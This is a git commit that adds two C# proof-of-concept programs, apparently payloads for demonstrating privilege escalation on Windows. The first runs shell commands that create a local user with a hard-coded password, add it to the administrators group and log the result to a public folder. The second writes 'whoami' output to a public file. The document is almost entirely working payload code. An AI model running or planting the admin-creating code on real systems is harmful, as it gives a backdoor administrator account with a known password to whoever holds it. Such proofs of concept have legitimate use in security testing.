049f648c939ef232c5053e3b0d8197a8ff8610f7
Ebloin <33060432+Ebloin@users.noreply.github.com>
2022-01-18 10:26:46 +0100

    Add files via upload
    Added POCs

---
+++ CreateAdmin-exe-POC/CreateAdmin-exe-POC/Program.cs
@@ -0,0 +1,18 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace CreateAdmin_exe_POC
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            System.Diagnostics.Process.Start("CMD.exe", "/c \"net user LocalAdminPrivEsc Priv3scPOC! /add \"");
+            System.Diagnostics.Process.Start("CMD.exe", "/c \"net localgroup administrators LocalAdminPrivEsc /add \"");
+            System.Diagnostics.Process.Start("CMD.exe", "/c \"echo 'New local Admin LocalAdminPrivEsc created with password Priv3scPOC!' > C:\\\\Users\\Public\\LocalAdmin-POC.txt \"");
+        }
+    }
+}
---
+++ Whoami-exe-POC/Whoami-exe-POC/Program.cs
@@ -0,0 +1,16 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Whoami_exe_POC
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            System.Diagnostics.Process.Start("CMD.exe", "/c \"whoami > C:\\\\Users\\Public\\POC.txt\"");
+        }
+    }
+}
